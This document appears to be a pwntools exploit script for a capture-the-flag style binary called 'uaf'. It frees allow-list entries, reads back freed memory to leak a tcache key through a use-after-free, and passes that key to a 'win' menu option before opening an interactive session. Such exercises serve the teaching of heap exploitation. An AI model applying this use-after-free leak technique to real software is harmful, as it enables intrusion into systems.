from pwn import *

DEBUG = False

def exploit(): 
    
    def connect():
        if not DEBUG: 
            return process("./uaf")
        else:
            return gdb.debug("./uaf", '''
                                      continue
                                      ''')
    def allocate_allow(ip):
        p.send(b'1\n')
        p.recvuntil(b"> ")
        p.send(ip.encode() + b'\n')
        p.recvuntil(b"> ")

    def print_allow():
        p.send(b"3\n")
        return p.recvuntil(b"> ")

    def clear_allow():
        p.send(b"4\n")
        p.recvuntil(b"> ")
    
    def win(tcache_key: 0):
        p.send(b"9\n")
        p.recvuntil(b"> ")
        p.send(str(tcache_key).encode() + b'\n')

    p = connect()
    p.recvuntil(b"> ")

    allocate_allow("10.10.1.1")
    allocate_allow("10.10.1.2")
   
    
    clear_allow()
    leak = print_allow().decode()
    leak = leak.split("IP index ")
    if (len(leak) == 1): 
        print("[ Error ]: Could not find IP index in printout")
        exit(1)

    tcache_key = int(leak[1].split(": ")[0])

    win(tcache_key)
    p.interactive()

def main():
    exploit()

if __name__ == "__main__": 
    # context.log_level = "debug"
    main()
